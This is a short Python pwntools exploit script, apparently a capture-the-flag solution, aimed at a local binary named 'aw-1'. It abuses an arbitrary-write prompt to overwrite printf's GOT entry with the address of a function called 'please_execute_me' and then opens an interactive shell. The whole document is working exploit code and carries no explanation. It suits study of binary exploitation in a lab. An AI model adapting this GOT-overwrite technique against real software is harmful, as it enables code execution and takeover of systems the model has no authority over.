from pwn import *

env = {'PATH' : '.:/bin:/usr/bin'}

# Addresses needed for the attack
got_addr = 0x602028 # Address of the got entry

command = '\x51\x08\x40\x00\x00\x00\x00\x00'

# Launch processs
p = process('./aw-1', env=env)
please_execute_me_addr = p.elf.symbols['please_execute_me']

# Write 8 bytes
print(p.recvline())
print(p.recvline())
p.sendline('8')

# Write to GOT entry of printf
print(p.recvline())
p.sendline(hex(got_addr))

# Write address of please execute me
print(p.recvline())
p.sendline(command)

# Use shell
p.interactive()
